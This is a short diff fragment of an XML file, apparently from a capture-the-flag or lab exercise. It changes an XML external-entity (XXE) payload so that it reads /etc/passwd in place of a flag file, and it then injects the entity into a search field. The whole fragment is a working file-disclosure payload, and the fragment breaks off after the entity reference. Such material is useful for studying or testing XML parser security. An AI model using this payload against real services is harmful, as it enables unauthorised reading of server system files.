@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
+<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <root>
 <search>
 &xxe;
